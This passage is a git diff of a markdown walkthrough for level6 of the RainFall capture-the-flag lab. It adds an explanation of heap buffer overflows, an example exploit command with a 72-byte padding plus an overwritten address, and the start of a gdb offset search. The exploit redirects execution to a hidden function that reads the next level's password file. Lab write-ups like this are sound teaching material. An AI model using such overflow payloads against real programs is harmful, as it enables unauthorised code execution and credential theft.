@@ -41,13 +41,20 @@ level6@RainFall:~$
 - `m` return the function `puts` with the string "`Nope`" only.
 - The hidden and non-used function `n` return `system("/bin/cat /home/user/level7/.pass")`.
 
-# Vulnerability : <u>Buffer overflow Attack</u>
+# Vulnerability : <u>Heap Buffer overflow Attack</u>
 
 (__It's ridiculous...__)
 
-**Objective** : Overflow the buffer to call the hidden function `n`
+**Objective** : Overflow the buffer (stocked in the heap) to call the hidden function `n`
 
 ## 1. Find the offset to reach the return address (for more details how to find the offset, see the [level2 walkthrough](https://github.com/Nimpoo/rainfall/tree/main/level2))
+
+**A heap buffer overflow** is a type of buffer overflow that occurs in the heap data area. Heap overflows are exploitable in a different manner to that of stack-based overflows. Memory on the heap is dynamically allocated by the application at runtime and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers. The canonical heap overflow attack involves causing the application to overwrite a function pointer or exception handler, which is then executed.
+
+```sh
+# Example of a heap buffer overflow attack
+./vulnerable_program $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
+```
 
 ```sh
 (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
